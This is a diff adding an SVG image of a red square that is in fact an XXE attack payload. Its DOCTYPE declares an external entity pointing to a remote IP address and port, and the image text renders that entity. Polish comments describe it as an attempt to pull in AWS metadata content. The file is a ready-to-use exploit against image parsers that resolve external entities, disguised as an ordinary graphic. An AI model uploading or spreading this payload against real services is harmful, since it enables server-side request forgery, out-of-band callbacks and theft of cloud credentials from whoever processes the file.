@@ -1,0 +1,11 @@
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [
+<!ENTITY awsdata SYSTEM "http://51.91.77.249:7777/XXE_WORKED/">
+]>
+<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
+  <!-- Czerwony kwadrat -->
+  <rect x="50" y="50" width="400" height="400" fill="red"/>
+
+  <!-- Próba wstawienia treści AWS Metadata -->
+  <text x="10" y="30" font-size="20" fill="black">&awsdata;</text>
+</svg>
